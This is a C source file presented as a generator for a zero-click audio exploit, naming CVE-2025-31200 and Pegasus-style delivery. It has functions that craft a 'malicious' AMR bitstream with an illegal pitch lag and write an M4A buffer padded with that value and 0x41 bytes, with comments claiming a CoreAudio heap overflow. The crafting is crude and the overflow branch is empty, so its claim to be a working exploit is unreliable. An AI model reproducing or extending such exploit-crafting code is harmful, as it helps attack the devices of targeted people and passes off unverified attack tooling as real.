// amr_decoder.c - AMR Audio Decoder (CVE-2025-31200)
// Graphite/Pegasus-style audio-based zero-click delivery

#include "amr_decoder.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

AMR_EXPORT int amr_is_illegal_pitch(int pitch_lag) {
    return pitch_lag > AMR_MAX_PITCH_LAG;
}

AMR_EXPORT int amr_decode(const int *bitstream, int bitstream_len, AMRFrame *out_frame) {
    if (!bitstream || !out_frame || bitstream_len < 11) return 0;

    out_frame->pitch_lag = bitstream[0];
    out_frame->is_illegal = (out_frame->pitch_lag > AMR_MAX_PITCH_LAG) ? 1 : 0;

    // Populate LSF coefficients
    for (int i = 0; i < 10 && (i + 1) < bitstream_len; i++) {
        out_frame->lsf[i] = (double)bitstream[i + 1];
    }
    out_frame->sample_rate = 8000.0f;

    if (out_frame->is_illegal) {
        // This is the point where the 210-byte heap overflow occurs in CoreAudio
        // The illegal pitch lag (248) causes buffer overflow in AudioConverterService
    }

    return 1;
}

AMR_EXPORT size_t amr_craft_malicious(int *out_bitstream, int max_len) {
    if (!out_bitstream || max_len < 11) return 0;

    // Craft malicious AMR bitstream with illegal pitch lag (248)
    out_bitstream[0] = AMR_GLITCH_LAG;  // Illegal pitch lag
    for (int i = 1; i < 11; i++) {
        out_bitstream[i] = i;  // LSF coefficients
    }
    return 11;
}

AMR_EXPORT size_t amr_craft_m4a(uint8_t *buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 256) return 0;

    size_t pos = 0;

    // ftyp box
    const char *ftyp = "ftypM4A ";
    size_t ftyp_len = 8;
    uint32_t ftyp_size = ftyp_len + 8;
    if (pos + ftyp_size <= buffer_size) {
        buffer[pos++] = (ftyp_size >> 24) & 0xFF;
        buffer[pos++] = (ftyp_size >> 16) & 0xFF;
        buffer[pos++] = (ftyp_size >> 8) & 0xFF;
        buffer[pos++] = ftyp_size & 0xFF;
        memcpy(buffer + pos, ftyp, ftyp_len);
        pos += ftyp_len;
        buffer[pos++] = 0; buffer[pos++] = 0; buffer[pos++] = 0; buffer[pos++] = 0;
    }

    // moov box with malicious AMR data
    if (pos + 512 <= buffer_size) {
        uint32_t moov_size = 512;
        buffer[pos++] = (moov_size >> 24) & 0xFF;
        buffer[pos++] = (moov_size >> 16) & 0xFF;
        buffer[pos++] = (moov_size >> 8) & 0xFF;
        buffer[pos++] = moov_size & 0xFF;
        buffer[pos++] = 'm'; buffer[pos++] = 'o'; buffer[pos++] = 'o'; buffer[pos++] = 'v';
        // Fill with AMR payload
        for (int i = 0; i < 504 && pos < buffer_size; i++) {
            buffer[pos++] = (i == 0) ? AMR_GLITCH_LAG : 0x41;
        }
    }

    return pos;
}
